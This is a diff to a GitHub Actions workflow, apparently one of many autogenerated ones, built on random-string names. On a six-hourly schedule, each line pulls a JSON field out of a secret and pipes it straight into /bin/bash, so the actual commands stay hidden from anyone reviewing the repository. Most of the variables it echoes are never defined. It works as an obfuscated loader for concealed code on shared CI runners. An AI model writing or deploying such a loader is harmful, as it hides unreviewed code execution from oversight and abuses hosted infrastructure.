@@ -1,22 +1,29 @@
 name: daijiazx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
+    - cron: '51 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: daijiazx
         env:
-          qlo160: ${{ secrets.qlo160 }}
+          yqc91299: ${{ secrets.yqc91299 }}
         run: |
-          echo $qlo160 | jq -r .gqr66 | /bin/bash
-          echo $snqnl35082 | jq -r .wz2 | /bin/bash
-          echo $k32604 | jq -r .ij2304 | /bin/bash
-          echo $odrhd8348 | jq -r .rucbd41484 | /bin/bash
-          echo $nbz68 | jq -r .dxn67531 | /bin/bash
+          echo $yqc91299 | jq -r .vzwp77 | /bin/bash
+          echo $xhjno66 | jq -r .hnvdi3 | /bin/bash
+          echo $ah6 | jq -r .kw64 | /bin/bash
+          echo $gp7 | jq -r .qh3 | /bin/bash
+          echo $mbj7 | jq -r .eni0032 | /bin/bash
+          echo $uelz9 | jq -r .fea652 | /bin/bash
+          echo $wgk665 | jq -r .fnw6 | /bin/bash
+          echo $gd09305 | jq -r .alj50 | /bin/bash
+          echo $ysfv9 | jq -r .s98 | /bin/bash
+          echo $fxpek283 | jq -r .wcfma551 | /bin/bash
+          echo $azm07268 | jq -r .lojz04673 | /bin/bash
+          echo $oqmp245 | jq -r .ncj56798 | /bin/bash
 
